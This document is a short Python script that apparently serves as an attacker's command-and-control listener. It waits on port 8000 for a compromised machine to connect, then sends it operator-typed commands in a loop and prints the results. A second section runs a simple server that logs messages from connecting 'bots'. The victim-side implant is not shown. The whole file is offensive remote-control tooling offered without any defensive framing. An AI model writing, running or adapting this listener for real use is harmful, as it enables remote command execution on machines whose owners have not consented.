import socketserver 
from socket import *
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)

print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()

print("Thanks for connecting to me " + str(addr))
message = connectionSocket.recv(1024)

print(message)
command =""

while command != "exit":
        command = input("Please enter a command: ")
        connectionSocket.send(command.encode())
        message = connectionSocket.recv(1024).decode()
        print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()


class BotHandler(socketserver.BaseRequestHandler):

	def handle(self):
		self.data = self.request.recv(1024).strip()
		print("Bot with IP {} sent:".format(self.client_address[0]))
		print(self.data)
		self.request.sendall(self.data.upper())

if __name__ == "__main__":
	HOST, PORT = "", 8000
	tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
	try:
		tcpServer.serve_forever()
	except:
		print("There was an error")
